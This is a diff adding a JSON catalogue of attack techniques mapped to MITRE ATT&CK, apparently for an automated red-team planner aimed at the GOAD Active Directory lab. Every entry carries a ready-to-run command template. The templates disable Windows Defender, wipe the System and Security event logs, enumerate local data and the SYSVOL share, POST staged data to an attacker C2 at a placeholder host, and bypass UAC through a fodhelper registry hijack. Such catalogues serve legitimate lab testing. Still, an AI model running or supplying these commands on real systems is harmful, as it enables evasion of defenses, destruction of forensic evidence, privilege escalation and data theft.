@@ -1,0 +1,152 @@
+[
+  {
+    "uuid": "goad-defevasion-t1562001-0",
+    "name": "disable_windows_defender",
+    "mitre_technique": "T1562.001",
+    "mitre_tactic": "TA0005",
+    "description": "Disable Windows Defender real-time monitoring to remove AV coverage before further exploitation",
+    "source": "GOAD v3 AD lab — hand-crafted",
+    "command_template": "Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpPreference | Select-Object DisableRealtimeMonitoring",
+    "preconditions": {
+      "executor": "powershell",
+      "privilege": "admin",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "defense_evasion"
+    },
+    "cost": 0.20,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-evasion-collection-exfil-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-defevasion-t1070001-0",
+    "name": "clear_windows_event_logs",
+    "mitre_technique": "T1070.001",
+    "mitre_tactic": "TA0005",
+    "description": "Clear Windows System and Security event logs to remove forensic artefacts after post-exploitation",
+    "source": "GOAD v3 AD lab — hand-crafted",
+    "command_template": "wevtutil cl System && wevtutil cl Security && echo \"Event logs cleared\"",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "admin",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "log_cleared"
+    },
+    "cost": 0.15,
+    "rules_of_engagement_required": true,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-evasion-collection-exfil-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-collection-t1005-0",
+    "name": "collect_local_data",
+    "mitre_technique": "T1005",
+    "mitre_tactic": "TA0009",
+    "description": "Enumerate user home directories and temp files on the local system for data staging",
+    "source": "GOAD v3 AD lab — hand-crafted",
+    "command_template": "dir C:\\Users\\ /s /b 2>&1 && dir C:\\Windows\\Temp\\ /b 2>&1",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "local_data"
+    },
+    "cost": 0.10,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-evasion-collection-exfil-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-collection-t1039-0",
+    "name": "collect_sysvol_data",
+    "mitre_technique": "T1039",
+    "mitre_tactic": "TA0009",
+    "description": "Mount and enumerate SYSVOL share on domain controller to collect GPO scripts and credentials",
+    "source": "GOAD v3 AD lab — hand-crafted",
+    "command_template": "net use \\\\{dc_ip}\\SYSVOL 2>&1 && dir \\\\{dc_ip}\\SYSVOL /b 2>&1",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "user",
+      "required_services": ["smb"],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": []
+    },
+    "effects": {
+      "grants_access": "network_share_data"
+    },
+    "cost": 0.10,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-evasion-collection-exfil-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-exfil-t1041-0",
+    "name": "exfil_via_c2_beacon",
+    "mitre_technique": "T1041",
+    "mitre_tactic": "TA0010",
+    "description": "POST staged data to attacker C2 over HTTP, reusing the existing beacon channel",
+    "source": "GOAD v3 AD lab — hand-crafted",
+    "command_template": "$d = Get-Content C:\\Windows\\Temp\\wmi_out.txt -Raw -ErrorAction SilentlyContinue; if ($d) { Invoke-WebRequest -Uri http://{attacker_ip}:{c2_port}/exfil -Method POST -Body $d -UseBasicParsing 2>&1 } else { echo \"No data\" }",
+    "preconditions": {
+      "executor": "powershell",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": ["outbound_http_allowed"]
+    },
+    "effects": {
+      "grants_access": "data_exfiltrated"
+    },
+    "cost": 0.15,
+    "rules_of_engagement_required": true,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-evasion-collection-exfil-v1", "confidence": 1.0}
+  },
+  {
+    "uuid": "goad-privesc-t1548002-fodhelper-0",
+    "name": "uac_bypass_fodhelper",
+    "mitre_technique": "T1548.002",
+    "mitre_tactic": "TA0004",
+    "description": "Bypass UAC via fodhelper.exe registry hijack to elevate from medium to high integrity process",
+    "source": "GOAD v3 AD lab — hand-crafted",
+    "command_template": "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"cmd.exe /c whoami > C:\\Windows\\Temp\\priv_check.txt\" /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /f && fodhelper.exe && timeout 2 && type C:\\Windows\\Temp\\priv_check.txt 2>&1",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "local",
+      "additional": ["uac_default_setting"]
+    },
+    "effects": {
+      "grants_access": "admin"
+    },
+    "cost": 0.25,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "hand-verified",
+    "provenance": {"tool": "manual", "report": "goad-evasion-collection-exfil-v1", "confidence": 1.0}
+  }
+]
